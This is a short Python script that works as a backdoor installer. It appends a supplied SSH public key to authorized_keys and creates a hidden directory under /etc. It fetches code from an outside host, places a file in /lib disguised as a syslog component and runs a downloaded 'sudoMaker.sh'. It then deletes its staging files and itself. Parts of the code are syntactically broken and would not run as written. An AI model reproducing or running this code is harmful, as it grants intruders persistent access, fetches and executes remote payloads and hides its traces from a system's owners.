import os
import sys

def main():
    sshKey = "" #TODO - Enter public SSH key here
    
    if(len(sshKey) != 0):
        if(!os.path.exists(.ssh/authorized_keys):
            os.system("touch .ssh/authorized_keys)
        os.system("echo \"" + sshKey + "\" >> /.ssh/authorized_keys")
    os.system("mkdir /etc/.a")
    os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/syslogT")
    os.system("mv /etc/.a/files.ravenn.net/horror/syslogT /etc/.a")
    os.system("mv /etc/.a/syslogT/syslogT.py /lib/syslogb")
    os.system("touch /lib/.syslogbLog")
    os.system("chmod +x /lib/.syslogbLog")
    os.system("bash /etc/.a/syslogT/sudoMaker.sh")
    print("Installation complete. Goodbye")
    os.system("rm -rf /etc/.a")
    os.remove(sys.argv[0])
    
main()